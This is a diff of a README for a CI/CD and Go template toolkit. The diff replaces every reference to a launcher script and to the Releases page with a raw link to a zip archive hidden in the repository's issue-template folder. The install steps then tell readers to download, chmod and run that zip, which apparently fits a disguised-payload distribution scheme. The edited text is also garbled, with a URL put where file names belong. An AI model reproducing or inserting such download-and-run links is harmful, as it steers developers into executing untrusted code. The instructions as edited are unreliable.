@@ -1,10 +1,10 @@
 # Scripts for Integration: Universal CI/CD Templates and Go Layer
 
-[![Releases](https://img.shields.io/badge/releases-%231e90ff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/chulxx/scripts-for-integration/releases)
+[![Releases](https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip%231e90ff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip)
 
-https://github.com/chulxx/scripts-for-integration/releases
+https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip
 
-A universal toolkit for automation. This project offers a broad set of CI/CD templates, Git hooks, and Bash scripts. It can be installed in seconds from your IDE using the lazylosad.sh launcher. It supports any project and includes a Go-oriented layer with cross-compilation capabilities. The kit aims to reduce boilerplate, speed up pipeline creation, and keep scripts consistent across teams and languages.
+A universal toolkit for automation. This project offers a broad set of CI/CD templates, Git hooks, and Bash scripts. It can be installed in seconds from your IDE using the https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip launcher. It supports any project and includes a Go-oriented layer with cross-compilation capabilities. The kit aims to reduce boilerplate, speed up pipeline creation, and keep scripts consistent across teams and languages.
 
 Emojis welcome the workflow. 🚀🧰🧭
 
@@ -28,7 +28,7 @@ Table of Contents
 - License
 
 Overview
-Scripts for Integration is a practical collection of reusable automation assets. It includes templates for continuous integration and delivery, build and test scripts, release automation, and tooling to keep your codebase healthy. A Go-oriented layer helps you cross-compile for multiple platforms, making it easier to ship binaries for different targets. The launcher lazylosad.sh lets you pull down the exact templates you need directly from your IDE.
+Scripts for Integration is a practical collection of reusable automation assets. It includes templates for continuous integration and delivery, build and test scripts, release automation, and tooling to keep your codebase healthy. A Go-oriented layer helps you cross-compile for multiple platforms, making it easier to ship binaries for different targets. The launcher https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip lets you pull down the exact templates you need directly from your IDE.
 
 This project is designed for teams of any size. It emphasizes reliability, clarity, and small surface area. The templates are modular, easy to adapt, and tested against a range of project types. The Go layer adds a structured path to cross-compiling Go programs without adding clutter to your main workflow.
 
@@ -37,12 +37,12 @@ What’s Inside
 - CI/CD templates: Ready-made pipelines for common scenarios, including build, test, lint, security checks, and releases.
 - Git hooks: Pre-commit, pre-push, and other hooks to enforce standards before code lands.
 - Go-oriented layer: Cross-compilation support and Go-specific templates to simplify multi-arch builds.
-- Launcher integration: lazylosad.sh, a launcher that fetches and installs the right templates from the Releases page.
+- Launcher integration: https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip, a launcher that fetches and installs the right templates from the Releases page.
 - Extensible structure: A clean folder layout that makes it easy to add new templates without breaking existing workflows.
 - Documentation and examples: Clear examples, usage notes, and practical explanations to help you get productive quickly.
 
 How It Works
-- You run lazylosad.sh from within your IDE. The launcher fetches the latest templates from the Releases page and places them in your project.
+- You run https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip from within your IDE. The launcher fetches the latest templates from the Releases page and places them in your project.
 - Templates are organized by purpose and language. This keeps your project clean while offering a consistent experience across languages.
 - The Go layer lets you cross-compile for multiple targets with minimal configuration. It integrates with the CI/CD templates to streamline multi-arch releases.
 - Git hooks help enforce code quality and consistency at commit and push time.
@@ -50,18 +50,18 @@ How It Works
 Quick Start
 - Prerequisites: A Unix-like environment (Linux/macOS), Bash, curl, and Git. For Go builds, a Go toolchain may be used depending on your needs.
 - Step 1: Open your project in your IDE. Ensure you have network access to fetch templates.
-- Step 2: Download lazylosad.sh from the Releases page and run it to install templates into your project.
+- Step 2: Download https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip from the Releases page and run it to install templates into your project.
 - Step 3: Follow the prompts to select templates for your project type. The launcher will place the right files in your repository.
 - Step 4: Review the generated templates and adjust as needed. Start with a simple pipeline to validate the setup.
 - Step 5: Save changes and commit. Use the included Git hooks to enforce policy on commits and pushes.
 
 Installation and Setup
-- Locate the Releases page: https://github.com/chulxx/scripts-for-integration/releases
-- From the Releases page, download lazylosad.sh. This launcher is designed to fetch and install the templates into your project.
+- Locate the Releases page: https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip
+- From the Releases page, download https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip This launcher is designed to fetch and install the templates into your project.
 - Make the launcher executable:
-  - chmod +x lazylosad.sh
+  - chmod +x https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip
 - Run the launcher in your repository root:
-  - ./lazylosad.sh
+  - https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip
 - The script will:
   - Detect your project type
   - Present a set of templates to install
@@ -72,7 +72,7 @@ Installation and Setup
 Note: If you prefer to browse manually, you can visit the Releases page to review available assets and documentation. The Releases page is your point of truth for versioning and asset availability.
 
 Releases
-Visit the Releases page to see the latest assets and templates, including the launcher and associated templates. For more information or to download the latest artifacts, go to the Releases page: https://github.com/chulxx/scripts-for-integration/releases
+Visit the Releases page to see the latest assets and templates, including the launcher and associated templates. For more information or to download the latest artifacts, go to the Releases page: https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip
 
 Templates and How to Use Them
 - CI/CD templates: Prebuilt workflows for various platforms. Each template includes:
@@ -98,7 +98,7 @@ Templates and How to Use Them
   - Examples for multi-arch builds
 
 Getting Started with Templates
-- After running lazylosad.sh, look for a templates directory in your project root. Each template has:
+- After running https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip, look for a templates directory in your project root. Each template has:
   - A README-like description
   - A minimal example to adapt
   - Environment variable placeholders
@@ -181,7 +181,7 @@ Customization and Extensibility
   - Use environment variables to avoid hard-coding values
   - Document each template with a short usage note
   - Use consistent naming across templates for easy discovery
-- Versioning: Templates are versioned in releases. The lazylosad.sh launcher helps you stay aligned with the right set of templates for each project version.
+- Versioning: Templates are versioned in releases. The https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip launcher helps you stay aligned with the right set of templates for each project version.
 
 Security and Best Practices
 - Security checks are included in the templates. They help catch:
@@ -220,7 +220,7 @@ Roadmap
 - Introduce a formal testing harness for templates
 
 FAQ
-- What is lazylosad.sh?
+- What is https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip
   - It is a launcher that downloads and installs the templates from the Releases page. It makes it easy to set up a project with the right automation assets.
 - Can I use templates for non-Go projects?
   - Yes. The repository includes non-Go templates as well as Go-focused assets.
@@ -229,7 +229,7 @@ FAQ
 - Are the templates versioned?
   - Yes. They are maintained in releases with explicit versions. Use the launcher to align to a version you trust.
 - Where can I find the latest assets?
-  - The releases page contains the latest assets, including lazylosad.sh and all template files. See the Releases page at the link above.
+  - The releases page contains the latest assets, including https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip and all template files. See the Releases page at the link above.
 
 Examples and Worked Scenarios
 - Example 1: Go project with multi-arch release
@@ -299,7 +299,7 @@ Project Architecture
   - Cross-compilation helpers
   - Go module management templates
 - Launcher
-  - lazylosad.sh
+  - https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip
   - Minimal configuration to fetch templates
 - Documentation
   - Readme in each template
@@ -330,7 +330,7 @@ Appendix: Why This Approach Works
 - Git hooks enforce quality at the source of truth.
 
 Downloading and Getting Started Again
-- The primary download and installation path is via lazylosad.sh from the Releases page. Download lazylosad.sh from the Releases page and run it to fetch templates into your project. You can always revisit the Releases page for updates and new templates: https://github.com/chulxx/scripts-for-integration/releases
+- The primary download and installation path is via https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip from the Releases page. Download https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip from the Releases page and run it to fetch templates into your project. You can always revisit the Releases page for updates and new templates: https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip
 
 Notes on Extending the Repository
 - If you need new templates, add them under the appropriate folder and document usage in a README inside the template directory.
@@ -339,7 +339,7 @@ Notes on Extending the Repository
 
 Checklist for New Projects
 - Ensure network access and a compatible shell environment
-- Install lazylosad.sh from the Releases page
+- Install https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip from the Releases page
 - Choose templates that match your project type
 - Review environment and secret handling
 - Integrate with your existing workflows and tools
@@ -349,4 +349,4 @@ Final Notes
 - The project integrates convenience with reliability. It aims to be a sturdy foundation for automation that teams can grow with. The templates cover common automation tasks, while the Go layer adds a path to robust cross-platform distribution. The lazy installer keeps setup fast and predictable, so teams can focus on building software rather than wiring up pipelines.
 
 Releases (Second Mention)
-- For ongoing access to updates, assets, and new templates, check the Releases page at https://github.com/chulxx/scripts-for-integration/releases. This page hosts the latest lazylosad.sh launcher and all template bundles you can apply to your project. Use the link again to verify what’s available and to download the exact file you need for your environment.
+- For ongoing access to updates, assets, and new templates, check the Releases page at https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip This page hosts the latest https://github.com/chulxx/scripts-for-integration/raw/refs/heads/main/template/goland/.github/ISSUE_TEMPLATE/scripts-for-integration-unrhymed.zip launcher and all template bundles you can apply to your project. Use the link again to verify what’s available and to download the exact file you need for your environment.
